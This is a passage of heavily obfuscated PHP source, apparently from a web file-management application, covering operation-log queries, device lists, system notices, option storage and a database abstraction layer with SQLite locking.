LNG($»×·ÃÇ[2413]), $»×·ÃÇ[2414] => LNG($»×·ÃÇ[2415]), $»×·ÃÇ[2416] => LNG($»×·ÃÇ[2417]), $»×·ÃÇ[212] => LNG($»×·ÃÇ[212]), $»×·ÃÇ[213] => LNG($»×·ÃÇ[2418]), $»×·ÃÇ[2419] => LNG($»×·ÃÇ[2419])); } private function typeFile() { $È¸Ô÷±³ =& $_SERVER[Ùæõ‰Ï’]; $ó›İåŸµ = array($È¸Ô÷±³[1957] => array($È¸Ô÷±³[1958]), $È¸Ô÷±³[2358] => array($È¸Ô÷±³[2420]), $È¸Ô÷±³[2360] => array($È¸Ô÷±³[2421]), $È¸Ô÷±³[1950] => array($È¸Ô÷±³[1951], $È¸Ô÷±³[2422]), $È¸Ô÷±³[2368] => array(), $È¸Ô÷±³[2370] => array(), $È¸Ô÷±³[2372] => array(), $È¸Ô÷±³[1960] => array($È¸Ô÷±³[1962]), $È¸Ô÷±³[1961] => array($È¸Ô÷±³[1962]), $È¸Ô÷±³[2376] => array($È¸Ô÷±³[2423]), $È¸Ô÷±³[2378] => array($È¸Ô÷±³[2423]), $È¸Ô÷±³[2380] => array($È¸Ô÷±³[2424]), $È¸Ô÷±³[2366] => array($È¸Ô÷±³[2425]), $È¸Ô÷±³[1955] => array($È¸Ô÷±³[2426]), $È¸Ô÷±³[2383] => array($È¸Ô÷±³[2427]), $È¸Ô÷±³[1954] => array($È¸Ô÷±³[1956])); return $ó›İåŸµ; } private function typeAll() { $”¾¬“¹Í =& $_SERVER[Ùæõ‰Ï’]; $Üâô İ­ = $this->typeList; $µèÆ˜Ã· = array_filter($this->typeFile()); foreach ($µèÆ˜Ã· as $©ï€¡ñ× => $ÛÄÓŸø) { $Üâô İ­[$ÛÄÓŸø[0]] = $Üâô İ­[$©ï€¡ñ×]; } $Üâô İ­[$”¾¬“¹Í[1962]] = LNG($”¾¬“¹Í[2428]); $Üâô İ­[$”¾¬“¹Í[2423]] = LNG($”¾¬“¹Í[2429]); return $Üâô İ­; } public function addLog($›ëë…¾, $²Şß¹ÍÖ = array()) { $§ÂÏùíó =& $_SERVER[Ùæõ‰Ï’]; if (!isset($this->typeList[$›ëë…¾])) { return; } $“¸’†È = Session::get($§ÂÏùíó[2120]); if (!$“¸’†È) { $“¸’†È = _get($²Şß¹ÍÖ, $§ÂÏùíó[1781], 0); } if ($›ëë…¾ == $§ÂÏùíó[2395] && is_array($²Şß¹ÍÖ[$§ÂÏùíó[2430]]) && !$²Şß¹ÍÖ[$§ÂÏùíó[2430]]) { return; } $óé«óÚÓ = get_client_ip(); if (!$²Şß¹ÍÖ || strlen(json_encode($²Şß¹ÍÖ)) >= 1024 * 64) { if ($²Şß¹ÍÖ && is_array($²Şß¹ÍÖ)) { $²Şß¹ÍÖ = array_intersect_key($²Şß¹ÍÖ, array_flip($§ÂÏùíó[475], $§ÂÏùíó[32])); $²Şß¹ÍÖ[$§ÂÏùíó[2431]] = $óé«óÚÓ; } else { $²Şß¹ÍÖ = array($§ÂÏùíó[2431] => $óé«óÚÓ); } } else { if (is_array($²Şß¹ÍÖ)) { $²Şß¹ÍÖ[$§ÂÏùíó[2431]] = $óé«óÚÓ; } else { $²Şß¹ÍÖ = array($§ÂÏùíó[1300] => $²Şß¹ÍÖ, $§ÂÏùíó[2431] => $óé«óÚÓ); } } $²Şß¹ÍÖ = array($§ÂÏùíó[1771] => Session::sign(), $§ÂÏùíó[1772] => intval($“¸’†È), $§ÂÏùíó[33] => $›ëë…¾, $§ÂÏùíó[1774] => json_encode($²Şß¹ÍÖ)); parent::add($²Şß¹ÍÖ); } public function remove($Ç•äùàö) { $this->where(array($_SERVER[Ùæõ‰Ï’][493] => $Ç•äùàö))->delete(); } private function _makeOrder($¢º§é®ù = '') { $èí³…©õ =& $_SERVER[Ùæõ‰Ï’]; $ã×ıÜß‡ = $èí³…©õ[231]; $Áóùşä¥ = array($èí³…©õ[523] => $èí³…©õ[524], $èí³…©õ[525] => $èí³…©õ[526]); $ÛÉæÜÏè = Input::get($èí³…©õ[531], $èí³…©õ[7], $èí³…©õ[2156], array($èí³…©õ[2074], $èí³…©õ[525])); $ÛÉæÜÏè = $Áóùşä¥[$ÛÉæÜÏè]; $¢º§é®ù = $¢º§é®ù . "{$ã×ıÜß‡}\x20{$ÛÉæÜÏè}"; return $this->order($¢º§é®ù); } public function get($Ù¶À‚¿Œ = '') { $‹á¥Ğé¦ =& $_SERVER[Ùæõ‰Ï’]; if (!$Ù¶À‚¿Œ) { show_json(array()); } $£—½µ’ã = array(); if ($Ù¶À‚¿Œ[$‹á¥Ğé¦[1781]]) { $£—½µ’ã[$‹á¥Ğé¦[1781]] = $Ù¶À‚¿Œ[$‹á¥Ğé¦[1781]]; } if (isset($Ù¶À‚¿Œ[$‹á¥Ğé¦[843]])) { $Ã¿€„Ù = $Ù¶À‚¿Œ[$‹á¥Ğé¦[843]]; $Â™õ«Œ¥ = isset($Ù¶À‚¿Œ[$‹á¥Ğé¦[844]]) ? $Ù¶À‚¿Œ[$‹á¥Ğé¦[844]] : time(); $£—½µ’ã[$‹á¥Ğé¦[231]] = array($‹á¥Ğé¦[409], array($Ã¿€„Ù, $Â™õ«Œ¥)); } if ($Ù¶À‚¿Œ[$‹á¥Ğé¦[33]]) { $ÒŸàÊ´ = explode($‹á¥Ğé¦[50], $Ù¶À‚¿Œ[$‹á¥Ğé¦[33]]); $£ü×ö¿¯ = $this->typeFile(); $Ã’æıÇŠ = array(); foreach ($ÒŸàÊ´ as $ËËÄÎ‹ ) { $Ã’æıÇŠ[] = $ËËÄÎ‹ ; if (isset($£ü×ö¿¯[$ËËÄÎ‹ ])) { $Ã’æıÇŠ = array_merge($Ã’æıÇŠ, $£ü×ö¿¯[$ËËÄÎ‹ ]); } } $Ã’æıÇŠ = array_unique($Ã’æıÇŠ); if ($Ã’æıÇŠ) { $£—½µ’ã[$‹á¥Ğé¦[33]] = array($‹á¥Ğé¦[7], $Ã’æıÇŠ); } } else { $£—½µ’ã[$‹á¥Ğé¦[33]] = array($‹á¥Ğé¦[2432], $‹á¥Ğé¦[2433]); } if (!empty($Ù¶À‚¿Œ[$‹á¥Ğé¦[2431]])) { $£—½µ’ã[$‹á¥Ğé¦[526]] = array($‹á¥Ğé¦[459], "\45{$Ù¶À‚¿Œ[$‹á¥Ğé¦[2431]]}\x25"); } $¬ğ©¦ãÔ = $this->_makeOrder()->where($£—½µ’ã)->selectPage(); if (empty($¬ğ©¦ãÔ[$‹á¥Ğé¦[445]])) { show_json(array(), !0, $¬ğ©¦ãÔ[$‹á¥Ğé¦[442]]); } $¬ğ©¦ãÔ[$‹á¥Ğé¦[445]] = $this->logList($¬ğ©¦ãÔ[$‹á¥Ğé¦[445]]); return $¬ğ©¦ãÔ; } private function ipAddress(&$Ş§¿ú) { $Õ©‹óşŞ =& $_SERVER[Ùæõ‰Ï’]; if (!empty($Ş§¿ú[$Õ©‹óşŞ[2431]])) { $ÇğÔÄ®× = IpLocation::get($Ş§¿ú[$Õ©‹óşŞ[2431]]); } else { $ÇğÔÄ®× = LNG($Õ©‹óşŞ[2434]); } $Ş§¿ú[$Õ©‹óşŞ[2435]] = $ÇğÔÄ®×; } private function descZipDownload($‰ƒ„Ô¡, &$ì„äˆ) { $ÔıüŠ¹½ =& $_SERVER[Ùæõ‰Ï’]; if (!isset($‰ƒ„Ô¡[$ÔıüŠ¹½[2436]])) { return; } $ÔÊŸê£š = json_decode($‰ƒ„Ô¡[$ÔıüŠ¹½[2436]], !0); foreach ($ÔÊŸê£š as $¤ü±¡É“) { try { $ÄÀ••’Ó = IO::infoFullSimple($¤ü±¡É“[$ÔıüŠ¹½[87]]); } catch (Exception $¾ÚŞƒ­) { continue; } $‰ƒ„Ô¡[$ÔıüŠ¹½[87]] = $¤ü±¡É“[$ÔıüŠ¹½[87]]; $ì„äˆ[] = $‰ƒ„Ô¡[$ÔıüŠ¹½[193]] = $ÄÀ••’Ó[$ÔıüŠ¹½[193]]; $ì„äˆ[] = $‰ƒ„Ô¡[$ÔıüŠ¹½[2212]] = $ÄÀ••’Ó[$ÔıüŠ¹½[192]]; break; } return $‰ƒ„Ô¡; } private function getSourceList(&$Ö‡€äÆ) { $øÎİÑæ‘ =& $_SERVER[Ùæõ‰Ï’]; $°œ¦šß´ = array(); foreach ($Ö‡€äÆ as $ªß®ÑÅ => $›ˆû½Ó“) { $ÍöºÂä = json_decode($›ˆû½Ó“[$øÎİÑæ‘[526]], !0); if ($›ˆû½Ó“[$øÎİÑæ‘[33]] == $øÎİÑæ‘[1953]) { $ÍöºÂä = $this->descZipDownload($ÍöºÂä, $°œ¦šß´); $Ö‡€äÆ[$ªß®ÑÅ][$øÎİÑæ‘[526]] = json_encode($ÍöºÂä); continue; } if (strpos($›ˆû½Ó“[$øÎİÑæ‘[33]], $øÎİÑæ‘[2214]) !== 0) { if (!isset($ÍöºÂä[$øÎİÑæ‘[87]]) || strpos($›ˆû½Ó“[$øÎİÑæ‘[33]], $øÎİÑæ‘[2437]) !== 0) { continue; } try { $œè©ÛØñ = IO::infoFullSimple($ÍöºÂä[$øÎİÑæ‘[87]]); } catch (Exception $×ÀöÊ”è) { continue; } $°œ¦šß´[] = $ÍöºÂä[$øÎİÑæ‘[193]] = $œè©ÛØñ[$øÎİÑæ‘[193]]; $°œ¦šß´[] = $ÍöºÂä[$øÎİÑæ‘[2212]] = $œè©ÛØñ[$øÎİÑæ‘[192]]; $Ö‡€äÆ[$ªß®ÑÅ][$øÎİÑæ‘[526]] = json_encode($ÍöºÂä); continue; } $°œ¦šß´[] = $ÍöºÂä[$øÎİÑæ‘[193]]; $°œ¦šß´[] = $ÍöºÂä[$øÎİÑæ‘[2212]]; if ($ÍöºÂä[$øÎİÑæ‘[33]] == $øÎİÑæ‘[620]) { $°œ¦šß´[] = $ÍöºÂä[$øÎİÑæ‘[526]][$øÎİÑæ‘[1254]]; $°œ¦šß´[] = $ÍöºÂä[$øÎİÑæ‘[526]][$øÎİÑæ‘[1255]]; } if ($ÍöºÂä[$øÎİÑæ‘[33]] == $øÎİÑæ‘[2223]) { $°œ¦šß´[] = $ÍöºÂä[$øÎİÑæ‘[526]][$øÎİÑæ‘[193]]; } } if (!$°œ¦šß´) { return array(); } return Model($øÎİÑæ‘[907])->sourceListInfo($°œ¦šß´, !0); } private function logList($©µË›¾ñ) { $¾°«ÎÆ =& $_SERVER[Ùæõ‰Ï’]; $õİßÀ× = array_to_keyvalue($©µË›¾ñ, $¾°«ÎÆ[12], $¾°«ÎÆ[1781]); $£†§õúŸ = Model($¾°«ÎÆ[598])->userListInfo(array_unique($õİßÀ×)); $§£¼¶—£ = $this->getSourceList($©µË›¾ñ); $ÑŒ”®Äô = $this->typeAll(); $ìí¦²İ€ = array(); $æƒÈıÜƒ = array(); foreach ($©µË›¾ñ as $Œ–ÁêöÂ => $Ç—Şè¤) { $…±§Š = $Ç—Şè¤[$¾°«ÎÆ[33]]; $ƒŒÏÇí = isset($£†§õúŸ[$Ç—Şè¤[$¾°«ÎÆ[1781]]]) ? $£†§õúŸ[$Ç—Şè¤[$¾°«ÎÆ[1781]]] : !1; $’éŒ û¶ = strpos($…±§Š, $¾°«ÎÆ[2438]) === 0 ? LNG($¾°«ÎÆ[2439]) : LNG($¾°«ÎÆ[2434]); $Ç—Şè¤[$¾°«ÎÆ[32]] = isset($ƒŒÏÇí[$¾°«ÎÆ[32]]) ? $ƒŒÏÇí[$¾°«ÎÆ[32]] : LNG($¾°«ÎÆ[2434]); $Ç—Şè¤[$¾°«ÎÆ[2267]] = isset($ƒŒÏÇí[$¾°«ÎÆ[2267]]) ? $ƒŒÏÇí[$¾°«ÎÆ[2267]] : $¾°«ÎÆ[12]; $Ç—Şè¤[$¾°«ÎÆ[1670]] = isset($ÑŒ”®Äô[$…±§Š]) ? $ÑŒ”®Äô[$…±§Š] : $’éŒ û¶; $Ç—Şè¤[$¾°«ÎÆ[2155]] = $ƒŒÏÇí; $¨Ÿ‘™Êº = json_decode($Ç—Şè¤[$¾°«ÎÆ[526]], !0); $Ç—Şè¤[$¾°«ÎÆ[2431]] = isset($¨Ÿ‘™Êº[$¾°«ÎÆ[2431]]) ? $¨Ÿ‘™Êº[$¾°«ÎÆ[2431]] : $¾°«ÎÆ[12]; $Ç—Şè¤[$¾°«ÎÆ[2435]] = IpLocation::get($Ç—Şè¤[$¾°«ÎÆ[2431]]); if (strpos($…±§Š, $¾°«ÎÆ[2214]) === 0 || isset($¨Ÿ‘™Êº[$¾°«ÎÆ[2212]])) { $¨Ÿ‘™Êº[$¾°«ÎÆ[90]] = $§£¼¶—£[$¨Ÿ‘™Êº[$¾°«ÎÆ[193]]]; $¨Ÿ‘™Êº[$¾°«ÎÆ[2228]] = $§£¼¶—£[$¨Ÿ‘™Êº[$¾°«ÎÆ[2212]]]; if ($¨Ÿ‘™Êº[$¾°«ÎÆ[33]] == $¾°«ÎÆ[620]) { $¨Ÿ‘™Êº[$¾°«ÎÆ[526]][$¾°«ÎÆ[1254]] = $§£¼¶—£[$¨Ÿ‘™Êº[$¾°«ÎÆ[526]][$¾°«ÎÆ[1254]]]; $¨Ÿ‘™Êº[$¾°«ÎÆ[526]][$¾°«ÎÆ[1255]] = $§£¼¶—£[$¨Ÿ‘™Êº[$¾°«ÎÆ[526]][$¾°«ÎÆ[1255]]]; } if ($¨Ÿ‘™Êº[$¾°«ÎÆ[33]] == $¾°«ÎÆ[2223]) { $¨Ÿ‘™Êº[$¾°«ÎÆ[526]][$¾°«ÎÆ[193]] = $§£¼¶—£[$¨Ÿ‘™Êº[$¾°«ÎÆ[526]][$¾°«ÎÆ[193]]]; } if ($¨Ÿ‘™Êº[$¾°«ÎÆ[33]] == $¾°«ÎÆ[1948]) { $¨Ÿ‘™Êº[$¾°«ÎÆ[2228]] = $¨Ÿ‘™Êº[$¾°«ÎÆ[90]]; $¨Ÿ‘™Êº[$¾°«ÎÆ[2212]] = $¨Ÿ‘™Êº[$¾°«ÎÆ[2228]][$¾°«ÎÆ[193]]; $¨Ÿ‘™Êº[$¾°«ÎÆ[90]] = !1; $¨Ÿ‘™Êº[$¾°«ÎÆ[193]] = $¾°«ÎÆ[12]; } $­„‘Ñí = array($¾°«ÎÆ[1948], $¾°«ÎÆ[2210]); if (!in_array($¨Ÿ‘™Êº[$¾°«ÎÆ[33]], $­„‘Ñí)) { if ($¨Ÿ‘™Êº[$¾°«ÎÆ[90]] && $¨Ÿ‘™Êº[$¾°«ÎÆ[90]][$¾°«ÎÆ[190]] == $¾°«ÎÆ[191]) { $æƒÈıÜƒ[] = $Ç—Şè¤[$¾°«ÎÆ[475]]; unset($©µË›¾ñ[$Œ–ÁêöÂ]); continue; } if ($¨Ÿ‘™Êº[$¾°«ÎÆ[2228]] && $¨Ÿ‘™Êº[$¾°«ÎÆ[2228]][$¾°«ÎÆ[190]] == $¾°«ÎÆ[191]) { $æƒÈıÜƒ[] = $Ç—Şè¤[$¾°«ÎÆ[475]]; unset($©µË›¾ñ[$Œ–ÁêöÂ]); continue; } } } $Ç—Şè¤[$¾°«ÎÆ[526]] = $¨Ÿ‘™Êº; unset($Ç—Şè¤[$¾°«ÎÆ[2440]]); $ìí¦²İ€[] = $Ç—Şè¤; } $this->clearSystemPathLog($æƒÈıÜƒ); return $ìí¦²İ€; } private function clearSystemPathLog($²¼ºû“) { $ñºç€½á =& $_SERVER[Ùæõ‰Ï’]; if (count($²¼ºû“) == 0) { return; } $Ÿ’óÂë = array($ñºç€½á[475] => array($ñºç€½á[7], array_unique($²¼ºû“))); $this->where($Ÿ’óÂë)->delete(); } public function deviceList($ë°ÔƒĞª, $öĞ‘ß¸ = 0) { $‡ú±¨ =& $_SERVER[Ùæõ‰Ï’]; $ÌÒ“ë“» = array($‡ú±¨[1781] => $ë°ÔƒĞª, $‡ú±¨[231] => array($‡ú±¨[1105], $öĞ‘ß¸), $‡ú±¨[33] => $‡ú±¨[1922]); $¾ğğ²û = array(); $’ÓÓÌâ¯ = $this->field($‡ú±¨[2441])->where($ÌÒ“ë“»)->order($‡ú±¨[2226])->limit(50)->select(); foreach ($’ÓÓÌâ¯ as $ÆÏ…Öª× => $áü…¾è·) { if ($ÆÏ…Öª× > 0 && abs($áü…¾è·[$‡ú±¨[231]] - $’ÓÓÌâ¯[$ÆÏ…Öª× - 1][$‡ú±¨[231]]) < 5) { continue; } $ìºâ™£® = json_decode($áü…¾è·[$‡ú±¨[526]], !0); $áü…¾è·[$‡ú±¨[2431]] = isset($ìºâ™£®[$‡ú±¨[2431]]) ? $ìºâ™£®[$‡ú±¨[2431]] : $‡ú±¨[12]; unset($ìºâ™£®[$‡ú±¨[2431]]); $’–ÃÍ«Ô = $this->deviceType($ìºâ™£®[$‡ú±¨[2215]]); if (isset($¾ğğ²û[$’–ÃÍ«Ô])) { continue; } $áü…¾è·[$‡ú±¨[2435]] = IpLocation::get($áü…¾è·[$‡ú±¨[2431]]); $áü…¾è·[$‡ú±¨[526]] = $ìºâ™£®; $¾ğğ²û[$’–ÃÍ«Ô] = $áü…¾è·; } return array_values($¾ğğ²û); } public function deviceType($ÜÉÔ³£Æ) { return $ÜÉÔ³£Æ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\156\157\x74\x69\x63\145\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x63\157\x6e\164\x65\x6e\x74", "\x61\165\x74\x68", "\155\157\x64\x65", "\164\151\x6d\145", "\x74\x79\160\145", "\x6c\145\166\x65\154", "\145\x6e\x61\x62\x6c\145", "\163\x6f\x72\x74"); public function listData($º¥¡»Ç³ = false, $Ã†ˆú Ç = "\163\157\x72\x74", $»ƒßãŠÊ = false) { return parent::listData($º¥¡»Ç³, $Ã†ˆú Ç, $»ƒßãŠÊ); } public function add($Ä¦ÚŒÍŒ) { $Éè¶Û†€ =& $_SERVER[Ùæõ‰Ï’]; $ıÃ—Ôá = time(); if ($Ä¦ÚŒÍŒ[$Éè¶Û†€[16]] == $Éè¶Û†€[2442]) { $ıÃ—Ôá = strtotime($Ä¦ÚŒÍŒ[$Éè¶Û†€[206]]); } $Ä¦ÚŒÍŒ[$Éè¶Û†€[206]] = $ıÃ—Ôá; return parent::insert($Ä¦ÚŒÍŒ); } public function update($ğˆü—×·, $é•¡Öô–) { $Û“£Éõ™ =& $_SERVER[Ùæõ‰Ï’]; $Ùüõì¤° = $this->listData($ğˆü—×·); if (!$Ùüõì¤°) { return !1; } $³ä•·é™ = time(); if ($é•¡Öô–[$Û“£Éõ™[16]] == $Û“£Éõ™[2442]) { $³ä•·é™ = strtotime($é•¡Öô–[$Û“£Éõ™[206]]); } $é•¡Öô–[$Û“£Éõ™[206]] = $³ä•·é™; return parent::update($ğˆü—×·, $é•¡Öô–); } public function remove($‚†‡Š®È) { $ó„ùòœ = $this->listData($‚†‡Š®È); if (!$ó„ùòœ || $ó„ùòœ[$_SERVER[Ùæõ‰Ï’][191]]) { return !1; } return parent::remove($‚†‡Š®È); } public function sort($Èš‚íÛ, $¿—ı‡âß) { return parent::update($Èš‚íÛ, $¿—ı‡âß); } public function enable($Èò¸¾üŸ, $şœ‘Ğ¼) { return parent::update($Èò¸¾üŸ, array($_SERVER[Ùæõ‰Ï’][2443] => $şœ‘Ğ¼)); } private function initUserOption() { $òƒÍÇÂ· =& $_SERVER[Ùæõ‰Ï’]; $this->optionType = $òƒÍÇÂ·[2444]; $this->modelType = $òƒÍÇÂ·[2445]; $this->field = array($òƒÍÇÂ·[2446], $òƒÍÇÂ·[32], $òƒÍÇÂ·[206], $òƒÍÇÂ·[33], $òƒÍÇÂ·[2447], $òƒÍÇÂ·[833], $òƒÍÇÂ·[226]); } public function userNoticeGet($Ğ¬–œÊÙ = false) { $this->initUserOption(); return parent::listData($Ğ¬–œÊÙ, $_SERVER[Ùæõ‰Ï’][475], !0); } public function userNoticeAdd($»ŞÁØÂ) { $òÌ ™û¿ =& $_SERVER[Ùæõ‰Ï’]; $this->initUserOption(); $ë´††É¦ = $this->findByKey($òÌ ™û¿[2446], $»ŞÁØÂ[$òÌ ™û¿[475]]); if ($ë´††É¦) { return !0; } $Óàœ­° = array($òÌ ™û¿[2446] => $»ŞÁØÂ[$òÌ ™û¿[475]], $òÌ ™û¿[32] => $»ŞÁØÂ[$òÌ ™û¿[32]], $òÌ ™û¿[206] => $»ŞÁØÂ[$òÌ ™û¿[206]], $òÌ ™û¿[33] => isset($»ŞÁØÂ[$òÌ ™û¿[33]]) ? $»ŞÁØÂ[$òÌ ™û¿[33]] : 1, $òÌ ™û¿[2447] => isset($»ŞÁØÂ[$òÌ ™û¿[2447]]) ? $»ŞÁØÂ[$òÌ ™û¿[2447]] : 0, $òÌ ™û¿[833] => 0, $òÌ ™û¿[226] => 0); return parent::insert($Óàœ­°); } public function userNoticeEdit($—¨§àÕš, $éïë›) { $this->initUserOption(); return parent::update($—¨§àÕš, $éïë›); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\137\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\154\x65", "\162\x6f\x6c\x65\107\162\157\x75\x70", "\162\x65\x67\x69\x73\164", "\145\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($üÆÚş‘«) { return "\123\171\163\x74\145\155\117\x70\164\151\157\156\137{$üÆÚş‘«}"; } protected function optionDefault($É³“„ÒÌ = '') { $ı“Ö¡œë =& $_SERVER[Ùæõ‰Ï’]; if ($É³“„ÒÌ == $ı“Ö¡œë[12]) { return $GLOBALS[$ı“Ö¡œë[6]][$ı“Ö¡œë[457]]; } } } goto E·–ñó‘ƒ; FğÕÔ‹ë„š: class DbSqlite3 extends DbSqlite3Base { public function query($®îÂØ¹œ) { $£ı¬öÈî =& $_SERVER[Ùæõ‰Ï’]; if (!CacheLock::fileLock($£ı¬öÈî[13])) { return !1; } $¹§ÕñŒ = parent::query($®îÂØ¹œ); CacheLock::fileUnLock($£ı¬öÈî[13]); return $¹§ÕñŒ; } public function execute($¢ÒÊÄ‡) { $¦­˜åâ =& $_SERVER[Ùæõ‰Ï’]; if (!CacheLock::fileLock($¦­˜åâ[13])) { return !1; } $éàÚ–© = parent::execute($¢ÒÊÄ‡); CacheLock::fileUnLock($¦­˜åâ[13]); return $éàÚ–©; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\x65\147\164" => "\76\75", "\154\164" => "\74", "\x65\154\164" => "\x3c\x3d", "\156\157\164\154\x69\153\145" => "\116\117\x54\x20\x4c\x49\113\x45", "\154\x69\153\x65" => "\114\x49\113\105", "\x69\156" => "\x49\116", "\156\x6f\x74\x69\x6e" => "\x4e\117\124\40\111\116", "\x6e\x6f\x74\x20\x69\156" => "\116\117\124\40\x49\x4e", "\142\x65\x74\167\x65\x65\156" => "\102\105\124\127\x45\105\x4e", "\x6e\x6f\x74\x62\145\164\167\x65\145\x6e" => "\116\x4f\124\x20\102\105\124\127\x45\105\116", "\x6e\157\x74\40\142\x65\164\x77\x65\x65\156" => "\116\117\x54\40\102\105\x54\127\105\x45\116"); protected $selectSql = "\123\x45\114\105\x43\124\45\x44\x49\x53\x54\x49\x4e\x43\x54\45\40\x25\x46\111\105\114\x44\x25\40\106\122\117\x4d\x20\x25\x54\101\102\x4c\x45\x25\x25\x4a\117\111\x4e\x25\x25\x57\x48\105\x52\x45\45\x25\x47\x52\117\x55\120\x25\x25\x48\x41\x56\x49\116\107\x25\x25\x4f\122\x44\x45\122\x25\x25\x4c\111\x4d\x49\124\x25\x20\x25\x55\116\x49\117\x4e\45\45\103\117\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $ƒ¦ÌŠƒµ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ùæõ‰Ï’][1051], $ƒ¦ÌŠƒµ); } public function factory($º±—¹÷â = '') { $ìê°—ä =& $_SERVER[Ùæõ‰Ï’]; $º±—¹÷â = $this->parseConfig($º±—¹÷â); if (empty($º±—¹÷â[$ìê°—ä[1052]])) { think_exception(think_lang($ìê°—ä[1053])); } $this->dbType = ucwords(strtolower($º±—¹÷â[$ìê°—ä[1052]])); $¡Ô‹»Õµ = $ìê°—ä[1054] . $this->dbType; if (class_exists($¡Ô‹»Õµ)) { $öâÙü’ = new $¡Ô‹»Õµ($º±—¹÷â); if ($ìê°—ä[1055] != strtolower($º±—¹÷â[$ìê°—ä[1052]])) { $öâÙü’->dbType = strtoupper($this->dbType); } else { $öâÙü’->dbType = $this->_getDsnType($º±—¹÷â[$ìê°—ä[1005]]); } } else { think_exception(think_lang($ìê°—ä[1056]) . $ìê°—ä[1057] . $¡Ô‹»Õµ); } return $öâÙü’; } public function __call($ıîï‹á, $ŠÆ¢õÚ) { if (method_exists($this, $ıîï‹á)) { return call_user_func_array(array($this, $ıîï‹á), $ŠÆ¢õÚ); } } protected function _getDsnType($ªüÄÄÆÙ) { $®ËùÀ˜Å = explode($_SERVER[Ùæõ‰Ï’][4], $ªüÄÄÆÙ); $¼ÌÑ¥İ… = strtoupper(trim($®ËùÀ˜Å[0])); return $¼ÌÑ¥İ…; } private function parseConfig($±›õ¥ßÈ = '') { $ˆŠÓ‰ËË =& $_SERVER[Ùæõ‰Ï’]; if (!empty($±›õ¥ßÈ) && is_string($±›õ¥ßÈ)) { $±›õ¥ßÈ = $this->parseDSN($±›õ¥ßÈ); } elseif (is_array($±›õ¥ßÈ)) { $±›õ¥ßÈ = array_change_key_case($±›õ¥ßÈ); $±›õ¥ßÈ = array($ˆŠÓ‰ËË[1052] => $±›õ¥ßÈ[$ˆŠÓ‰ËË[1058]], $ˆŠÓ‰ËË[977] => $±›õ¥ßÈ[$ˆŠÓ‰ËË[1059]], $ˆŠÓ‰ËË[978] => $±›õ¥ßÈ[$ˆŠÓ‰ËË[1060]], $ˆŠÓ‰ËË[975] => $±›õ¥ßÈ[$ˆŠÓ‰ËË[1061]], $ˆŠÓ‰ËË[976] => $±›õ¥ßÈ[$ˆŠÓ‰ËË[1062]], $ˆŠÓ‰ËË[21] => $±›õ¥ßÈ[$ˆŠÓ‰ËË[1063]], $ˆŠÓ‰ËË[1005] => $±›õ¥ßÈ[$ˆŠÓ‰ËË[1064]], $ˆŠÓ‰ËË[17] => isset($±›õ¥ßÈ[$ˆŠÓ‰ËË[1065]]) ? $±›õ¥ßÈ[$ˆŠÓ‰ËË[1065]] : array()); } elseif (empty($±›õ¥ßÈ)) { if (think_config($ˆŠÓ‰ËË[1066]) && $ˆŠÓ‰ËË[1055] != strtolower(think_config($ˆŠÓ‰ËË[1067]))) { $±›õ¥ßÈ = $this->parseDSN(think_config($ˆŠÓ‰ËË[1066])); } else { $±›õ¥ßÈ = array($ˆŠÓ‰ËË[1052] => think_config($ˆŠÓ‰ËË[1067]), $ˆŠÓ‰ËË[977] => think_config($ˆŠÓ‰ËË[1068]), $ˆŠÓ‰ËË[978] => think_config($ˆŠÓ‰ËË[1069]), $ˆŠÓ‰ËË[975] => think_config($ˆŠÓ‰ËË[1070]), $ˆŠÓ‰ËË[976] => think_config($ˆŠÓ‰ËË[1071]), $ˆŠÓ‰ËË[21] => think_config($ˆŠÓ‰ËË[323]), $ˆŠÓ‰ËË[1005] => think_config($ˆŠÓ‰ËË[1066]), $ˆŠÓ‰ËË[17] => think_config($ˆŠÓ‰ËË[1072])); } } return $±›õ¥ßÈ; } protected function initConnect($Ä‘¦Ïó­ = true) { if (1 == think_config($_SERVER[Ùæõ‰Ï’][22])) { $this->_linkID = $this->multiConnect($Ä‘¦Ïó­); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $»ğ £´ => $½¬Øş÷¶) { $this->_linkID = $½¬Øş÷¶; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($½‰Ê¥£© = false) { $ÂáëĞŞÑ =& $_SERVER[Ùæõ‰Ï’]; static $ÊÍÈ×˜ã = array(); static $Îã‡Çœ = -1; if (empty($ÊÍÈ×˜ã)) { foreach ($this->config as $Í§ƒÕœ => $ÄÔí¶ç) { $ÊÍÈ×˜ã[$Í§ƒÕœ] = explode($ÂáëĞŞÑ[50], $ÄÔí¶ç); } } if (think_config($ÂáëĞŞÑ[1073])) { if ($½‰Ê¥£© || think_config($ÂáëĞŞÑ[471]) === !0) { $ÉóöÃ = floor(mt_rand(0, think_config($ÂáëĞŞÑ[1074]) - 1)); $Îã‡Çœ = $ÉóöÃ; } else { if (is_numeric(think_config($ÂáëĞŞÑ[1075]))) { $ÉóöÃ = think_config($ÂáëĞŞÑ[1075]); } else { $ÉóöÃ = floor(mt_rand(think_config($ÂáëĞŞÑ[1074]), count($ÊÍÈ×˜ã[$ÂáëĞŞÑ[975]]) - 1)); } } } else { $ÉóöÃ = floor(mt_rand(0, count($ÊÍÈ×˜ã[$ÂáëĞŞÑ[975]]) - 1)); $Îã‡Çœ = $ÉóöÃ; } $ÉóöÃ = $Îã‡Çœ !== -1 ? $Îã‡Çœ : 